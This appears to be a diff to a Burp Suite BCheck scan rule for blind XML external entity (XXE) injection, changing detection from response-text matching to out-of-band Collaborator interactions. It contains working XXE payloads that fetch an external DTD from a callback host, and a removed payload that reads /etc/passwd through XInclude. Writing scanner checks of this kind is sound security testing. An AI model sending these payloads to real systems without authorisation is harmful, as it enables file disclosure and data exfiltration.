@@ -5,21 +5,21 @@ metadata:
     author: "BCheck Arsenal"
     tags: "xxe", "blind", "oob"
 
+define:
+    collab = {generate_collaborator_address()}
+
 run for each:
-    payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR/xxe\">%xxe;]><foo>test</foo>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://COLLABORATOR/evil.dtd\">%dtd;%send;]><foo>test</foo>",
-        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+    payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{collab}/xxe\">%xxe;]><foo>test</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://{collab}/evil.dtd\">%dtd;%send;]><foo>test</foo>"
 
 given insertion point then
     send payload:
         replacing: {payload}
 
-    if not({latest.response.status_code} is "400") then
-        if {latest.response} matches "(ENTITY|DOCTYPE|XInclude|xi:include)" then
-            report issue:
-                severity: high
-                confidence: tentative
-                detail: "Potential blind XXE. Server processes XML with external entity declarations. Verify with Burp Collaborator."
-                remediation: "Disable DTD processing entirely. Reject XML with DOCTYPE declarations."
-        end if
+    if any interactions then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: "Blind XXE detected. Server processed XML and performed an out-of-band interaction to Collaborator."
+            remediation: "Disable DTD processing entirely. Reject XML with DOCTYPE declarations."
     end if
